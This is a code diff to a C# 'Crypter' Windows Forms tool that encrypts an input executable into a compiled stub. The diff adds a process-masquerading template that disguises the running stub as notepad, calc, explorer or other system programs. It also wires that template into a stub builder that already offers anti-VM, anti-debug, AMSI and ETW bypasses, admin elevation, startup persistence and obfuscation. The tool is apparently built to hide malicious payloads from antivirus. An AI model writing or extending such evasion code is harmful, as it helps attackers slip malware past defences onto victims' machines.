@@ -49,7 +49,8 @@ namespace Crypter.Forms
                 obfuscation = obfuscator.Checked,
                 runas = runas.Checked,
                 usePolymorphicAes = polymorphicAes.Checked,
-                useArmdot = armdotObfuscation.Checked
+                useArmdot = armdotObfuscation.Checked,
+                processMasquerading = processMasquerading.Checked
             };
             return obj;
         }
@@ -65,6 +66,7 @@ namespace Crypter.Forms
             runas.Checked = obj.runas;
             polymorphicAes.Checked = obj.usePolymorphicAes;
             armdotObfuscation.Checked = obj.useArmdot;
+            processMasquerading.Checked = obj.processMasquerading;
         }
 
         static string antiVMTemplate()
@@ -376,7 +378,138 @@ public static void AddStartup()
 }";
         }
 
-        static string PublicStubTemplate(bool useAntiVM, bool useAntiDebug, bool useAmsiBypass, bool useEtwBypass, bool useRunAs, bool useStartup)
+        static string processMasqueradingTemplate()
+        {
+            return @"
+private static bool ApplyProcessMasquerading()
+{
+    try
+    {
+        // Get the path to a legitimate Windows process
+        string[] legitimateProcesses = new string[]
+        {
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ""notepad.exe""),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ""calc.exe""),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86), ""cmd.exe""),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), ""explorer.exe""),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), ""Internet Explorer\\iexplore.exe""),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), ""Windows NT\\Accessories\\wordpad.exe"")
+        };
+
+        // Pick a random legitimate process
+        Random rnd = new Random();
+        string targetProcess = legitimateProcesses[rnd.Next(legitimateProcesses.Length)];
+        
+        // Make sure the chosen file exists
+        if (!File.Exists(targetProcess))
+        {
+            // Try to find a fallback
+            foreach (string process in legitimateProcesses)
+            {
+                if (File.Exists(process))
+                {
+                    targetProcess = process;
+                    break;
+                }
+            }
+        }
+        
+        if (!File.Exists(targetProcess))
+            return false; // No legitimate process found
+            
+        // Create a disguised process name for taskbar/task manager
+        string currentProcessName = Process.GetCurrentProcess().MainModule.FileName;
+        string processName = Path.GetFileNameWithoutExtension(targetProcess);
+        
+        // Set window title to match legitimate process
+        Console.Title = processName;
+        
+        // Make the process appear like a legitimate one by performing legitimate operations
+        try
+        {
+            // Perform some file operations that the target process would typically do
+            if (processName.Equals(""notepad"", StringComparison.OrdinalIgnoreCase))
+            {
+                // Mimic notepad behavior by creating a temporary text file
+                string tempFile = Path.Combine(Path.GetTempPath(), ""temp_note.txt"");
+                File.WriteAllText(tempFile, """");
+                
+                // Register file type association mimicking what the real app would do
+                try
+                {
+                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
+                        ""Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.txt\\UserChoice"", false))
+                    {
+                        // Just reading the key mimics app behavior without making changes
+                        if (key != null)
+                        {
+                            object value = key.GetValue(""ProgId"");
+                        }
+                    }
+                }
+                catch { /* Ignore registry access errors */ }
+            }
+            else if (processName.Equals(""calc"", StringComparison.OrdinalIgnoreCase))
+            {
+                // Mimic calculator by performing some math operations
+                double result = 0;
+                for (int i = 0; i < 100; i++)
+                {
+                    result += Math.Sqrt(i);
+                }
+            }
+            
+            // Create a named mutex that the target process would typically create
+            string mutexName = ""Local\\"" + processName + ""_Instance_Mutex"";
+            bool createdNew = false;
+            using (var mutex = new System.Threading.Mutex(true, mutexName, out createdNew))
+            {
+                // Just creating and releasing the mutex mimics app behavior
+            }
+            
+            // Load common DLLs used by legitimate applications to appear authentic
+            try
+            {
+                // These DLL loads will change our process behavior to appear more legitimate
+                var shell32 = MasqLoadLibrary(""shell32.dll"");
+                var user32 = MasqLoadLibrary(""user32.dll"");
+                
+                // Create benign window classes that the application would typically register
+                IntPtr hInstance = Process.GetCurrentProcess().Handle;
+                
+                // Register and create dummy window to mimic application behavior
+                if (user32 != IntPtr.Zero)
+                {
+                    // We're just loading modules, not making actual API calls that could throw off errors
+                    MasqGetProcAddress(user32, ""CreateWindowExW"");
+                    MasqGetProcAddress(user32, ""RegisterClassExW"");
+                }
+            }
+            catch { /* Ignore any errors loading libraries */ }
+        }
+        catch { /* Ignore any errors in behavioral mimicking */ }
+        
+        return true;
+    }
+    catch
+    {
+        return false;
+    }
+}
+
+// Required imports for process masquerading - renamed to avoid conflicts
+[DllImport(""kernel32.dll"")]
+private static extern IntPtr MasqGetModuleHandle(string lpModuleName);
+
+[DllImport(""kernel32.dll"")]
+private static extern IntPtr MasqGetProcAddress(IntPtr hModule, string procName);
+
+[DllImport(""kernel32.dll"", SetLastError = true)]
+private static extern IntPtr MasqLoadLibrary(string lpFileName);
+";
+        }
+
+        static string PublicStubTemplate(bool useAntiVM, bool useAntiDebug, bool useAmsiBypass, bool useEtwBypass, bool useRunAs, bool useStartup, bool useProcessMasquerading)
         {
             string injectedMethods = "";
             string mainBody = "";
@@ -402,6 +535,12 @@ public static void AddStartup()
             {
                 injectedMethods += runasTemplate() + "\n";
                 mainBody += "            EnsureRunAsAdmin();\n";
+            }
+            
+            if (useProcessMasquerading)
+            {
+                injectedMethods += processMasqueradingTemplate() + "\n";
+                mainBody += "            ApplyProcessMasquerading();\n";
             }
 
             if (useAmsiBypass)
@@ -720,12 +859,12 @@ namespace {namespaceName}
         private void button2_Click(object sender, EventArgs e)
         {
             try
+        {
+            if (string.IsNullOrEmpty(inputfile.Text) || !File.Exists(inputfile.Text))
             {
-                if (string.IsNullOrEmpty(inputfile.Text) || !File.Exists(inputfile.Text))
-                {
-                    MessageBox.Show("No valid input file to read, is your exe empty or just doesn't exist?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return;
-                }
+                MessageBox.Show("No valid input file to read, is your exe empty or just doesn't exist?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
 
                 // Get the log path first
                 string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -772,8 +911,8 @@ namespace {namespaceName}
                 
                 string stubPath = Path.Combine(tempDir, "stub_" + timestamp + ".exe");
                 string obfPath = Path.Combine(tempDir, "stub_obf_" + timestamp + ".exe");
-                
-                byte[] exebytes = File.ReadAllBytes(inputfile.Text);
+
+            byte[] exebytes = File.ReadAllBytes(inputfile.Text);
                 
                 // Apply encryption with polymorphic behavior
                 // First apply XOR encryption with a key derived from the timestamp
@@ -796,14 +935,15 @@ namespace {namespaceName}
                 string base64exe = Convert.ToBase64String(encryptedBytes);
                 string keyString = Convert.ToBase64String(key);
 
-                string stub = PublicStubTemplate(
-                    antiVM.Checked,
-                    antiDebug.Checked,
-                    amsiBypass.Checked,
-                    etwBypass.Checked,
-                    runas.Checked,
-                    startup.Checked
-                );
+            string stub = PublicStubTemplate(
+                antiVM.Checked,
+                antiDebug.Checked,
+                amsiBypass.Checked,
+                etwBypass.Checked,
+                runas.Checked,
+                startup.Checked,
+                processMasquerading.Checked
+            );
 
                 string execPayload;
                 
@@ -898,31 +1038,31 @@ namespace {namespaceName}
                     stub = AddPolymorphicAesFunctionsToStub(stub);
                 }
 
-                var csc = new Microsoft.CSharp.CSharpCodeProvider();
-                var parameters = new System.CodeDom.Compiler.CompilerParameters
-                {
-                    GenerateExecutable = true,
-                    OutputAssembly = stubPath,
+            var csc = new Microsoft.CSharp.CSharpCodeProvider();
+            var parameters = new System.CodeDom.Compiler.CompilerParameters
+            {
+                GenerateExecutable = true,
+                OutputAssembly = stubPath,
                     CompilerOptions = "/target:winexe /optimize+",
-                    IncludeDebugInformation = false
-                };
+                IncludeDebugInformation = false
+            };
 
-                parameters.ReferencedAssemblies.Add("System.dll");
-                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
-                parameters.ReferencedAssemblies.Add("System.Security.dll");
-                parameters.ReferencedAssemblies.Add("System.Management.dll");
-                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+            parameters.ReferencedAssemblies.Add("System.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            parameters.ReferencedAssemblies.Add("System.Security.dll");
+            parameters.ReferencedAssemblies.Add("System.Management.dll");
+            parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                 parameters.ReferencedAssemblies.Add("System.Core.dll");
 
-                var results = csc.CompileAssemblyFromSource(parameters, stub);
+            var results = csc.CompileAssemblyFromSource(parameters, stub);
 
-                if (results.Errors.HasErrors)
-                {
-                    string errors = string.Join("\n", results.Errors.Cast<System.CodeDom.Compiler.CompilerError>().Select(err => err.ToString()));
+            if (results.Errors.HasErrors)
+            {
+                string errors = string.Join("\n", results.Errors.Cast<System.CodeDom.Compiler.CompilerError>().Select(err => err.ToString()));
                     File.WriteAllText(logPath, "Compilation errors:\n" + errors + "\n\nStub code:\n" + stub);
                     MessageBox.Show("Compilation failed. See log file at: " + logPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return;
-                }
+                return;
+            }
 
                 // Always create a simpler backup version with minimal obfuscation for Pulsar compatibility
                 try
@@ -932,17 +1072,17 @@ namespace {namespaceName}
                 catch (Exception ex)
                 {
                     File.AppendAllText(logPath, "Error copying file: " + ex.Message + "\n");
-                }
+            }
 
-                if (obfuscator.Checked)
+            if (obfuscator.Checked)
                 {
                     try 
-                    {
-                        if (!File.Exists(stubPath))
-                        {
-                            MessageBox.Show("Built stub.exe not found! Obfuscation skipped.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                            return;
-                        }
+            {
+                if (!File.Exists(stubPath))
+                {
+                    MessageBox.Show("Built stub.exe not found! Obfuscation skipped.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
 
                         // First apply our custom obfuscation with reduced settings
                         Obfuscator.ObfuscateMinimal(stubPath, obfPath);
@@ -984,9 +1124,9 @@ namespace {namespaceName}
                         File.AppendAllText(logPath, "\n\nObfuscation error:\n" + obfEx.ToString());
                         MessageBox.Show("Obfuscation failed. See log file at: " + logPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     }
-                }
-                else
-                {
+            }
+            else
+            {
                     // Copy final file to user-accessible location
                     string finalStubPath = Path.Combine(appDataPath, "stub_" + timestamp + ".exe");
                     
